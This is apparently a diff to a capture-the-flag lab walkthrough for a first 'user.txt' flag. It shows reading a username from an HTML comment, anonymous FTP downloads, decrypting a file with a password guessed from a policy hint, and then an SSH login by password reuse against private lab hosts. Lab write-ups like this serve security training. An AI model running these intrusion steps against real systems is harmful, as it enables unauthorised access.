@@ -3,11 +3,16 @@
 ## Flag 1 — user.txt (`flag{mock10_ssh_foothold}`)
 
 ```bash
-curl http://10.10.50.10                                   # find username "jreyes" in HTML comment
-curl ftp://anonymous:anonymous@10.10.50.11/pub/welcome.txt # password policy hint: PetName + year
-curl -o memo.enc ftp://anonymous:anonymous@10.10.50.11/pub/backup_notice.txt.enc
-openssl enc -aes-256-cbc -pbkdf2 -d -in memo.enc -k Rusty2024  # confirms password reuse on SSH
-ssh jreyes@10.10.50.12          # password: Rusty2024
+curl http://10.10.50.10   # find username "jreyes" in HTML comment
+
+ftp 10.10.50.11            # login: anonymous / anonymous
+cd pub
+get welcome.txt            # password policy hint: PetName + current year
+get backup_notice.txt.enc  # lands on the attacker machine
+bye
+
+openssl enc -aes-256-cbc -pbkdf2 -d -in backup_notice.txt.enc -k Rusty2026  # confirms password reuse on SSH
+ssh jreyes@10.10.50.12          # password: Rusty2026
 cat /home/jreyes/user.txt
 ```
 
